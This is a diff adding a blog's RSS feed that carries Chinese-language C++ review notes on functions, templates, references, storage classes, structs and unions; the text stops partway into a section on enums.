@@ -1,0 +1,3224 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>ZTsubaki_HOME</title><description>ZTsubaki_HOME</description><link>https://ssl.ztsubaki.xyz/</link><language>zh_CN</language><item><title>C++基础四：函数与引用</title><link>https://ssl.ztsubaki.xyz/posts/14/14/</link><guid isPermaLink="true">https://ssl.ztsubaki.xyz/posts/14/14/</guid><description>2025年春，C++复习笔记</description><pubDate>Sun, 02 Mar 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;1. 函数&lt;/h1&gt;
+&lt;p&gt;在&lt;code&gt;C++&lt;/code&gt;中，函数由两部分组成&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;函数原型/函数声明：提供函数名、返回值和参数列表，每个调用函数的文件中都要声明函数，一般写在头文件里&lt;/li&gt;
+&lt;li&gt;函数定义/函数实现：提供函数的具体内容，每个程序中每个函数必须且只能有一个函数实现&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;1.1. 函数原型&lt;/h3&gt;
+&lt;p&gt;函数原型是编译器与函数之间的接口。一个项目中函数往往分布在不同的文件中，甚至有时候是在编译好的库文件中，在链接之前，编译器需要为这些函数预留位置，这就必须知道函数的名称、参数和返回值，这样才能保证与外部函数正常链接。&lt;/p&gt;
+&lt;p&gt;函数原型的语法如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;type func(type,type,...);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;其中，每个函数有一个&lt;strong&gt;返回值&lt;/strong&gt;，也是就函数调用语句的类型，如果设置成&lt;code&gt;void&lt;/code&gt;则表示没有返回值。&lt;strong&gt;函数名&lt;/strong&gt;必须是一个合法的标识符，而且不能与其它标识符重复，&lt;strong&gt;函数参数&lt;/strong&gt;则可以只提供类型，也可以提供类型和名称，设置成&lt;code&gt;void&lt;/code&gt;或者留空表示没有参数&lt;/p&gt;
+&lt;h3&gt;1.2. 函数定义&lt;/h3&gt;
+&lt;p&gt;函数定义需要放在函数原型之后。它根据原型的描述，提供一个函数的具体代码，由函数头和函数体组成，&lt;strong&gt;函数头&lt;/strong&gt;与函数原型一致，唯一不同的是，为了使用参数中的变量，函数头必须为参数提供标识符，而函数原型不必要，函数头不是完整的语句，不用加分号，后面紧跟一个大括号，括号中就是函数的内容，叫做&lt;strong&gt;函数体&lt;/strong&gt;，函数头的参数列表相当于定义了一系列作用域为函数体的局部变量，函数体中可以正常使用这些变量&lt;/p&gt;
+&lt;p&gt;非&lt;code&gt;void&lt;/code&gt;函数函数体的结尾（包括所有分支的结尾）必须有返回语句&lt;code&gt;return name;&lt;/code&gt;，返回一个与函数的返回值类型相匹配的值，为了照顾一些编译器无法识别的复杂的情形，有的编译器中有返回值的函数没有返回语句不会产生错误，而是产生一个警告，继续编译，程序员应当确保每个可能的分支都以&lt;code&gt;return&lt;/code&gt;语句结尾，以免引发不必要的问题&lt;/p&gt;
+&lt;p&gt;结合上述内容，函数定义的标准形式如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;type func(type name,type name2,...)
+{
+    //...
+    return name3;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;return&lt;/code&gt;语句有时还会用作强行终止函数用，在使用&lt;code&gt;return&lt;/code&gt;语句后，无论函数运行到什么情况，都会强行弹出栈空间并返回，&lt;code&gt;void&lt;/code&gt;函数也可以使用&lt;code&gt;return&lt;/code&gt;语句终止函数，此时不用提供返回值&lt;/p&gt;
+&lt;p&gt;函数原型和函数定义可以合并在一起，即忽略函数原型，但是不能写在头文件中，否则会导致函数的多定义，外部文件需要使用该函数的话需要在对应文件中额外提供函数原型，而且由于调用必须在声明之后，原型与定义合并的写法会导致越后调用的函数越在前定义，不符合阅读习惯，在大型的&lt;code&gt;C&lt;/code&gt;语言程序源代码中经常出现要翻页很久才能找到&lt;code&gt;main&lt;/code&gt;函数开始读的情况，对程序员极不友好，&lt;code&gt;C++&lt;/code&gt;推荐将原型和定义分开的方法&lt;/p&gt;
+&lt;h3&gt;1.3. 函数调用&lt;/h3&gt;
+&lt;p&gt;使用函数的语句，我们称为函数调用，语法如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;func(value1,value2,...);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;函数调用是一个表达式，它的类型就是函数返回值的类型（&lt;code&gt;void&lt;/code&gt;也可以视为一种类型），从逻辑上可以完全用返回值替代函数调用，自然，它也可以直接作为一个语句使用，也可以忽略掉返回值不作处理&lt;/p&gt;
+&lt;p&gt;参数列表则要提供符合原型的值，可以是一个变量，一个表达式，一个字面值，函数调用时会对这些值进行复制，然后传给新函数，不会更改原函数中变量的值，同时调用结束后也会把返回值复制给原函数，并清空新函数的栈空间&lt;/p&gt;
+&lt;p&gt;在函数调用过程中，传递参数和返回值时，系统都会对数值自动进行隐式类型转换，需要额外注意规避可能存在的问题&lt;/p&gt;
+&lt;p&gt;函数中可以调用自身，我们把这样的操作称作&lt;strong&gt;递归&lt;/strong&gt;，递归可以实现很多数学上的递归算法，非常常用&lt;/p&gt;
+&lt;p&gt;:::important&lt;/p&gt;
+&lt;p&gt;为了查看函数调用的具体过程，我们编写如下代码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int func(int x);
+
+int main()
+{
+    int i = func(1);
+    return 0;
+}
+
+int func(int x)
+{
+    return ++x;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;然后使用以下命令关闭优化编译，并查看汇编代码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;g++ -O0 t.cpp
+objdump -S a.out
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;两个函数对应汇编代码如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;0000000000001119 &amp;lt;main&amp;gt;:
+    1119:	55                   	push   %rbp
+    111a:	48 89 e5             	mov    %rsp,%rbp
+    111d:	48 83 ec 10          	sub    $0x10,%rsp
+    1121:	bf 01 00 00 00       	mov    $0x1,%edi
+    1126:	e8 0a 00 00 00       	call   1135 &amp;lt;_Z4funci&amp;gt;
+    112b:	89 45 fc             	mov    %eax,-0x4(%rbp)
+    112e:	b8 00 00 00 00       	mov    $0x0,%eax
+    1133:	c9                   	leave
+    1134:	c3                   	ret
+
+0000000000001135 &amp;lt;_Z4funci&amp;gt;:
+    1135:	55                   	push   %rbp
+    1136:	48 89 e5             	mov    %rsp,%rbp
+    1139:	89 7d fc             	mov    %edi,-0x4(%rbp)
+    113c:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
+    1140:	8b 45 fc             	mov    -0x4(%rbp),%eax
+    1143:	5d                   	pop    %rbp
+    1144:	c3                   	ret
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可以看到，调用每个函数时，函数会将原先的帧指针&lt;code&gt;rbp&lt;/code&gt;压入栈，然后将当前栈指针的值赋予&lt;code&gt;rbp&lt;/code&gt;作为新函数的栈底，接着从寄存器取出参数，定义变量，都依次放在栈顶之后（栈地址从高向低生长），最后把返回值放在&lt;code&gt;edi&lt;/code&gt;寄存器，将原先压入栈的旧帧指针重新弹出到&lt;code&gt;rbp&lt;/code&gt;中，并更改程序计数器返回原先的函数中&lt;/p&gt;
+&lt;p&gt;在这个过程中，每次调用函数，都会把原先函数的帧指针和程序计数器信息（在&lt;code&gt;call&lt;/code&gt;和&lt;code&gt;ret&lt;/code&gt;指令中被操作）保存在栈中，函数没有结束时，局部变量也会一直保存在栈中不清除，而栈的空间往往是有限的，过深的递归会导致栈空间被占满，程序异常退出，而且递归过程反复移动值，效率也不高，因此只要能用循环代替递归就尽量不要用大规模的递归&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;h2&gt;2. 函数实用技术&lt;/h2&gt;
+&lt;h3&gt;2.1. 内联函数&lt;/h3&gt;
+&lt;p&gt;对于一些非常小且经常调用的函数，反复调用函数会产生相对很大的额外开销，我们就会使用&lt;strong&gt;内联函数&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;在函数原型和函数定义前都加上&lt;code&gt;inline&lt;/code&gt;关键字以将函数变为内联函数，内联函数会在编译时被直接合并到代码内，不进行实际的函数调用，如&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;inline add(int x,int y){return x+y};
+
+int main()
+{
+   	int x = 0,y = 0;
+    int z = add(x,y);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;等同于&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int main()
+{
+    int x = 0,y = 0;
+    int z = x + y;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;内联函数可以被写在头文件中，因为它更类似于一种文本替换的宏，而不是实际的定义（只是类似），但是，内联函数不能递归调用&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;inline&lt;/code&gt;关键字只是一种建议，如果编译器发现该函数内部存在递归，或者编译器认为这个函数非常庞大，函数最后可能不会被编译为内联函数，&lt;code&gt;inline&lt;/code&gt;关键字会被忽略&lt;/p&gt;
+&lt;h3&gt;2.2. main函数&lt;/h3&gt;
+&lt;p&gt;每个可执行程序都应该有（且只有）一个&lt;code&gt;main&lt;/code&gt;函数，无论该程序由多少个源文件和库文件（当然，库文件不应该有&lt;code&gt;main&lt;/code&gt;函数）组成，该函数会作为系统调用这个可执行文件时的入口&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;main&lt;/code&gt;函数返回一个&lt;code&gt;int&lt;/code&gt;值，表示程序执行的结果，&lt;code&gt;0&lt;/code&gt;表示正常退出&lt;/p&gt;
+&lt;p&gt;:::tip&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;main&lt;/code&gt;函数可以省略&lt;code&gt;return&lt;/code&gt;语句，编译器会默认返回&lt;code&gt;0&lt;/code&gt;，值得注意的是，只有&lt;code&gt;main&lt;/code&gt;函数这一个特殊的函数可以省略返回语句，编译器会为其加上默认的&lt;code&gt;return 0;&lt;/code&gt;，其他函数省略返回语句时，编译器不会为其加上返回的操作，这会导致程序出现错误并退出&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;main&lt;/code&gt;函数接收三个参数（如果不需要，也可以省略），一个&lt;code&gt;int&lt;/code&gt;，两个&lt;code&gt;char**&lt;/code&gt;，分别称&lt;code&gt;argc&lt;/code&gt;,&lt;code&gt;argv&lt;/code&gt;和&lt;code&gt;envp&lt;/code&gt;，&lt;code&gt;argc&lt;/code&gt;表示程序参数的数目，&lt;code&gt;argv&lt;/code&gt;是一个二维&lt;code&gt;char&lt;/code&gt;数组，也是一个字符串组成的一维数组，存储&lt;code&gt;argc&lt;/code&gt;个字符串，即系统调用该可执行程序时传入的参数，&lt;code&gt;envp&lt;/code&gt;是存储系统环境变量的字符串数组，最后一项为空指针，标记结尾&lt;/p&gt;
+&lt;h3&gt;2.3. 默认参数&lt;/h3&gt;
+&lt;p&gt;在函数原型（没有原型则在函数头）中，我们可以为参数赋予默认的参数&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;type fun(type name,type name2 = value2,type name3 = value3)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在函数原型里也一样可以省略标识符&lt;/p&gt;
+&lt;p&gt;在调用函数时，对于有默认值的函数，我们可以不给出这些参数，编译器会给它一个默认值&lt;/p&gt;
+&lt;p&gt;为了避免歧义&lt;code&gt;C++&lt;/code&gt;规定，有默认值的参数后面的参数必须都是有默认值的，在调用时也会按顺序匹配参数，不能跳过某个参数，比如对于上面的函数&lt;code&gt;fun(value1,,value3)&lt;/code&gt;这样的调用是不合法的&lt;/p&gt;
+&lt;p&gt;要实现上面这种跳过某个参数的功能，需要使用函数重载的功能&lt;/p&gt;
+&lt;h3&gt;2.4. 函数重载&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;C++&lt;/code&gt;允许一定程度上允许相同名字而参数、返回值不同的函数在不产生歧义的条件下存在，具体来说，在不考虑默认参数的情况下，&lt;code&gt;C++&lt;/code&gt;允许参数不同、参数和返回值都不同的同名函数存在，这些函数函数体没有要求，可以相似，也可以完全不同，在调用函数时，编译器会决定到底使用函数的哪个版本，这个功能通常用来实现更灵活的默认参数，或者面向对象编程的多态功能&lt;/p&gt;
+&lt;p&gt;:::tip&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;C++&lt;/code&gt;中运算符实际上也是函数，如两个&lt;code&gt;int x,y&lt;/code&gt;，&lt;code&gt;x*y&lt;/code&gt;实际上对应函数&lt;code&gt;int operator*(int x,int y)&lt;/code&gt;，基于此，我们就可以重载这些运算符函数，为任意类型定义这些运算，通常会用在我们自己定义的数据类型，如结构体、联合、类等&lt;/p&gt;
+&lt;p&gt;运算符重载有很大自由，我们可以为任意类型定义，哪怕对多元运算符不同操作数采取不同类型&lt;/p&gt;
+&lt;p&gt;运算符重载也有一定限制，我们无法更改运算符的操作数个数与顺序，也无法更改运算符的优先级与结合性，这一特点使我们在被重载的运算符用途与原先用途逻辑上区别很大时要格外注意优先级，如&lt;code&gt;C++&lt;/code&gt;中对流的操作重载的左右移位运算符，它们的优先级不是最低的，在操作数是复杂的表达式时，稍不小心就会产生优先级问题&lt;/p&gt;
+&lt;p&gt;在上一节的例子中，汇编代码中函数名相比源代码加了一些字符，这就是编译器为了区别重载函数而做的名称修饰&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;h3&gt;2.5. 函数模板&lt;/h3&gt;
+&lt;p&gt;有时我们需要对很多种变量类型进行相同的操作，如果对每种可能得变量都编写一个函数，会十分复杂，于是&lt;code&gt;C++&lt;/code&gt;中引入了对泛型的支持，具体到函数中就是函数模版&lt;/p&gt;
+&lt;p&gt;函数模版允许我们规定一个抽象的类型，当调用时，再根据具体使用的类型生成特定的函数，语法如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;template &amp;lt;typename T&amp;gt;//此处的typename是关键字，T才是模版类型的名字
+void templ(T,T);
+
+template &amp;lt;typename T&amp;gt;
+void templ(T a,T b)
+{
+ 	//...
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;函数内就将&lt;code&gt;T&lt;/code&gt;视为一种类型用，也可以在尖括号里定义多个模版类型&lt;/p&gt;
+&lt;p&gt;:::note&lt;/p&gt;
+&lt;p&gt;函数模版不是通常意义上的函数，编译器在遇到函数调用时才会根据函数调用的类型生成对应类型的函数实例，我们叫做&lt;strong&gt;实例化&lt;/strong&gt;，如果调用模板的类型不支持模版中某种操作也会在此时报错&lt;/p&gt;
+&lt;p&gt;同时，模版在调用时才实例化，也就是说在调用时才定义函数的实例，模版本身并不定义函数，只是生成函数的模版，因此，函数模版一般被放在头文件中，以供各个文件实例化自己的函数，这时，函数模版的原型和定义分开就没什么必要性了，一般不会分开写&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;p&gt;除了在调用时进行隐式实例化，也可以手动进行显式实例化定义&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;template void templ&amp;lt;type&amp;gt;(type,type);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;显式实例化定义会定义一个函数，它不应该被放在头文件中&lt;/p&gt;
+&lt;p&gt;更常用的一种操作是，在调用函数时进行显式实例化&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;templ&amp;lt;type&amp;gt;(a,b);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这样不管&lt;code&gt;a,b&lt;/code&gt;是什么类型，编译器都会实例化一个&lt;code&gt;type&lt;/code&gt;类型的模版，然后正常调用这个函数&lt;/p&gt;
+&lt;p&gt;最后，如果某个类型需要特殊处理，我们还可以对模版进行&lt;strong&gt;具体化&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;template&amp;lt;&amp;gt; void templ&amp;lt;type&amp;gt;(type,type);
+
+template&amp;lt;&amp;gt; void templ&amp;lt;type&amp;gt;(type a,type b){
+    \\...
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;和普通函数一样，具体化函数也有函数原型和函数体，函数原型放在头文件中，而函数体放在某一个文件中即可，上面的&lt;code&gt;&amp;lt;type&amp;gt;&lt;/code&gt;是可选的，编译器会根据后面的类型自动推断&lt;/p&gt;
+&lt;p&gt;:::note&lt;/p&gt;
+&lt;p&gt;加入模版后，我们的函数还是免不了产生很多歧义&lt;/p&gt;
+&lt;p&gt;这种时候，编译器会将所有隐式类型转换范围内允许的函数列表，之后按顺序匹配：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;值到引用、引用到值、数组到指针、指针到类型，以及变量到常量这些无关紧要的转换&lt;/li&gt;
+&lt;li&gt;从小到大的类型提升&lt;/li&gt;
+&lt;li&gt;从大到小，产生精度损失的转换&lt;/li&gt;
+&lt;li&gt;自定义的类型转换&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;如果最佳匹配中还是有多个，则&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;如果需要转换的数目不一样，选择需要转换数目最小的&lt;/li&gt;
+&lt;li&gt;模版函数与普通函数，优先选择普通函数&lt;/li&gt;
+&lt;li&gt;具体化函数与实例化函数，优先选择具体化函数&lt;/li&gt;
+&lt;li&gt;显式实例化函数与隐式实例化函数，优先选择隐式实例化函数&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;如果还是有多个匹配的，编译器将会产生二义性错误，终止编译&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;p&gt;:::tip&lt;/p&gt;
+&lt;p&gt;在使用模版时，还可能出现不知道返回值类型的情况&lt;/p&gt;
+&lt;p&gt;我们在模版中调用与模版类型相关的函数或者运算符时，并不知道返回的值的类型，无法确定保存这个值用的变量的类型，一个解决方案是用&lt;code&gt;auto&lt;/code&gt;关键字，另一个方案是使用&lt;code&gt;decltype&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;decltype()&lt;/code&gt;可以当作一个类型名使用，如果括号里是标识符，则是标识符对应的类型，如果括号里是函数调用，则是函数的返回值，如果是非标识符的左值（左值在第3节介绍），如括号括起来的标识符，则是左值类型的引用，如果括号里是表达式，则是表达式的类型&lt;/p&gt;
+&lt;p&gt;搭配&lt;code&gt;auto&lt;/code&gt;和后置返回值语法，还可以有如下用法&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;template&amp;lt;typename T1,typename T2&amp;gt;
+auto add(T1 x,T2 y) -&amp;gt; decltype(x+y)
+{
+    return x+y;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;h2&gt;3. 引用变量&lt;/h2&gt;
+&lt;p&gt;在传递函数的参数时，程序内部会将函数参数复制一份，这种做法效率较低，同时，函数也不能改变原先传参给函数那个变量的值，要是引入指针又未免过于复杂，于是&lt;code&gt;C++&lt;/code&gt;引入了&lt;strong&gt;引用&lt;/strong&gt;的概念&lt;/p&gt;
+&lt;p&gt;我们可以使用如下语法创建一个引用：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;type &amp;amp; name = var;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这将创建一个&lt;code&gt;type&lt;/code&gt;类型的引用，指向&lt;code&gt;var&lt;/code&gt;这个变量&lt;/p&gt;
+&lt;p&gt;这里的&lt;code&gt;type &amp;amp;&lt;/code&gt;是一个完整的类型，&lt;code&gt;&amp;amp;&lt;/code&gt;是类型名的一部分，而不是运算符&lt;/p&gt;
+&lt;p&gt;函数左边必须是一个&lt;strong&gt;左值&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;:::note&lt;/p&gt;
+&lt;p&gt;左值原本指在赋值语句左边的值，相对应的是右值，但是出现&lt;code&gt;const&lt;/code&gt;常量后，这一定义产生了分歧，最后的结论是，&lt;strong&gt;左值&lt;/strong&gt;指在内存中有实体的，可被引用的值，比如变量，常量，指针等等，而&lt;strong&gt;右值&lt;/strong&gt;就是在内存中没有实体，不可被引用的值，如表达式，常量字面值等&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;p&gt;一旦引用声明后，它就不能更改引用对象，对它的所有操作都等同于对引用对象的操作，它就是引用对象的另一个标识符，它们代表相同的一块内存区域，这实际上和常量指针是一样的&lt;/p&gt;
+&lt;p&gt;引用可以被隐式转换成普通类型，而普通类型只有左值会被隐式转换成引用，右值只能被隐式转换成常量指针（这会创建一个临时变量），如果试图将右值转换成变量指针，一些编译器仍然会创建临时变量，并抛出一个警告，另一些则会直接抛出警告终止编译&lt;/p&gt;
+&lt;p&gt;可以将引用作为函数的参数，此时调用函数时，编译器会自动对左值创建引用，函数通过操作参数就可以直接操作调用函数时作为参数的左值&lt;/p&gt;
+&lt;p&gt;如果只是将引用用来避免值传递，建议将参数设为&lt;code&gt;const&lt;/code&gt;，这样编译器会自动为右值也创建临时变量，而且常量也可以用作参数了（区别于值传递，值传递时仅传递数值，不对原先的变量产生影响，故不用管是左值还是右值，是常量还是变量），在此基础上如果返回值也是参数之一，可以返回一个常量引用，以此避免值传递（返回变量引用会导致函数调用变成左值，非常奇怪，而且返回的这个引用和参数完全一样，要更改可以更改原先的参数，不必是变量）&lt;/p&gt;
+&lt;p&gt;:::tip&lt;/p&gt;
+&lt;p&gt;在传递大型对象，像结构体、类的时候，我们一般会选择引用传递，以此避免大量值复制过去复制过来，如果只是个基本变量的话，使用引用往往是为了更改变量的值，不用更改值的话没必要用引用&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;p&gt;:::warning&lt;/p&gt;
+&lt;p&gt;使用引用作为返回值时要注意，只能引用参数或全局变量，不能引用函数内部定义的量，这些量在函数结束后就会被回收，会导致引用指向未分配的内存区域，产生严重后果&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+</content:encoded></item><item><title>C++基础三：变量、常量与复合数据类型</title><link>https://ssl.ztsubaki.xyz/posts/13/13/</link><guid isPermaLink="true">https://ssl.ztsubaki.xyz/posts/13/13/</guid><description>2025年春，C++复习笔记</description><pubDate>Sat, 01 Mar 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;1. 变量与常量&lt;/h2&gt;
+&lt;p&gt;使用声明语句可以声明一个变量&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;type name;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;而变量可以先声明，后赋值，且可以多次赋值，但请确保使用前被赋值&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;C++&lt;/code&gt;中的变量有自己的&lt;strong&gt;作用域&lt;/strong&gt;，我们只能在作用域中调用这个变量，对于不在任何代码块中的变量声明，即全局变量其作用域就是整个文件，否则就是所在最内层代码块，叫做局部变量&lt;/p&gt;
+&lt;p&gt;同一个标识符在同一个作用域中不能被多次声明，在不同且的作用域中被声明时，若二者作用域存在重复，则后声明的变量会覆盖掉前声明的变量（仅作用域覆盖，并不改变值），使前声明的变量处于暂时不可用的状态，直到后声明的变量离开作用域&lt;/p&gt;
+&lt;p&gt;在语句中声明的变量作用域就是这个语句&lt;/p&gt;
+&lt;p&gt;在变量的类型名前面加上&lt;code&gt;const&lt;/code&gt;表示该变量不可变，即它是一个常量，常量必须在创建时被赋值，否则无法再次更改值&lt;/p&gt;
+&lt;p&gt;也可以在变量前加上&lt;code&gt;volatile&lt;/code&gt;强调该变量可变，即使程序没有更改也可能发生更改，这是因为与硬件交互时，其他硬件可能会更改内存，而对于程序中没有更改的内存，编译器可能会进行优化，只访问一次内存，该关键字可以阻止编译器做这样的优化&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;C++&lt;/code&gt;中变量主要有以下三种存储方式&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;自动存储&lt;/p&gt;
+&lt;p&gt;在函数中定义的变量都会使用自动存储，自动存储的持续性与作用域相同，离开作用域后会立刻回收，自动存储的变量不会被自动初始化&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;静态存储&lt;/p&gt;
+&lt;p&gt;在函数外的全局变量，或者使用&lt;code&gt;static&lt;/code&gt;关键字定义的变量会使用静态存储，静态存储的持续性与整个程序相同，即使离开作用域也不会被回收，其声明语句只会被执行一次，哪怕含有赋值语句&lt;/p&gt;
+&lt;p&gt;:::important&lt;/p&gt;
+&lt;p&gt;在不同作用域中的静态变量不会被视为同一个，只有同一个声明在循环中或者函数调用中被多次运行，这些声明才会被视为同一个变量，如&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;static int a  = 1;
+a++;
+{
+    static int a = 1;
+    std::cout &amp;lt;&amp;lt; a;
+}
+//输出1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;而&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;for(int i = 0;i &amp;lt; 3;i ++)
+{
+    static int a = 1;
+    a++;
+    std::cout &amp;lt;&amp;lt; a;
+}
+//输出234
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;p&gt;静态变量会被默认初始化为&lt;code&gt;0&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;动态存储&lt;/p&gt;
+&lt;p&gt;由&lt;code&gt;new&lt;/code&gt;或者&lt;code&gt;malloc&lt;/code&gt;分配的内存，其存储由程序管理，直到使用&lt;code&gt;delete&lt;/code&gt;/&lt;code&gt;free&lt;/code&gt;或者程序结束才会被回收，我们将在后面详细讨论这种方式&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;2. 复合类型&lt;/h2&gt;
+&lt;h3&gt;2.1. 结构体&lt;/h3&gt;
+&lt;p&gt;结构体是一种将多个数据组合成一组的结构&lt;/p&gt;
+&lt;p&gt;结构体使用以下方法定义：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;struct name{
+    type1 name1;
+    type2 name2;
+};//注意分号结束
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;结构体中包含的变量可以是任何合法的变量，甚至是另一个结构体&lt;/p&gt;
+&lt;p&gt;结构体内变量的声明也可以加上赋值，这会在创建结构体时为他们赋予一个初始值&lt;/p&gt;
+&lt;p&gt;结构体中也可以包含函数，如果是一个与结构体同名切未表明返回值的函数会被用作构造函数，它会在创建结构体时被执行，但这些特性往往被更复杂的类使用，在结构体中很少使用&lt;/p&gt;
+&lt;p&gt;结构体定义之后可以和普通类型一样被声明，&lt;code&gt;C&lt;/code&gt;语言中需要使用&lt;code&gt;struct structname name&lt;/code&gt;，而&lt;code&gt;C++&lt;/code&gt;中可以省略&lt;code&gt;struct&lt;/code&gt;，使其表现与普通的类型一模一样&lt;/p&gt;
+&lt;p&gt;使用结构体时，可以使用&lt;code&gt;.&lt;/code&gt;来像访问普通变量一样访问结构体的成员，如&lt;code&gt;name.type1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;结构体在编译后不会被保留，其表现和一堆（逻辑上）绑定在一起的变量无异，不用担心额外的开销&lt;/p&gt;
+&lt;p&gt;结构体的定义可以和声明合并，如&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;struct st{
+    ...
+} name;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这样就定义了一个结构体&lt;code&gt;st&lt;/code&gt;，同时声明了一个对应&lt;code&gt;st&lt;/code&gt;类型的变量&lt;code&gt;name&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;这种情况下，也可以省略结构体的名称，使其成为匿名结构体，匿名结构体只能在定义时声明&lt;/p&gt;
+&lt;p&gt;结构体定义的作用域规则与变量一样，不过结构体定义本身不会执行任何操作，故它常常被放在函数外（作用域为整个文件）或者头文件中&lt;/p&gt;
+&lt;p&gt;当一个结构体的成员变量被设为&lt;code&gt;const&lt;/code&gt;时，它便只能初始化而无法更改值，而如果一个结构体变量被设为&lt;code&gt;const&lt;/code&gt;，它的所有成员变量都将不可变，我们可以将成员变量设为&lt;code&gt;mutable&lt;/code&gt;，这样即使结构体变量是&lt;code&gt;const&lt;/code&gt;，这个成员变量也能单独修改了&lt;/p&gt;
+&lt;h3&gt;2.2. 联合&lt;/h3&gt;
+&lt;p&gt;联合，也叫共用体，是一种能存储多种数据类型的结构，与结构体不同，它实际上只是一个可能是不同种类的变量，并不会同时存储所有变量&lt;/p&gt;
+&lt;p&gt;定义联合的语法与结构体相似&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;union union_name{
+    long long lvalue;
+    int ivalue;
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;使用时语法也和结构体一样，不一样的是，它的所有成员指向相同的地址，实际上都是同一个，同时只能使用它的一个成员，否则会产生错误&lt;/p&gt;
+&lt;p&gt;显然，为了保证内存够用，联合的内存就是它内存最大的成员的内存，在上面的例子中就是&lt;code&gt;long long&lt;/code&gt;的长度，哪怕使用&lt;code&gt;ivalue&lt;/code&gt;时会有空闲空间&lt;/p&gt;
+&lt;p&gt;联合也可以匿名，甚至可以不要变量名，此时可以直接使用成员的名字调用联合的成员，当然，它们依然代表相同的内存空间&lt;/p&gt;
+&lt;p&gt;联合常用于存储可能是多种形式的数据，如可能是数字也可能是字符串的编号，也会用在一些内存限制极为严苛的地方，但是由于这种方法比较难用，容易产生问题，且现代的计算机也没有那么缺内存，故人们更倾向于直接定义多个不同类型的变量&lt;/p&gt;
+&lt;p&gt;结构体和联合可以相互嵌套使用&lt;/p&gt;
+&lt;h3&gt;2.3. 枚举&lt;/h3&gt;
+&lt;p&gt;枚举是一种只有特定几种取值的结构&lt;/p&gt;
+&lt;p&gt;我们可以定义一个枚举&lt;/p&gt;
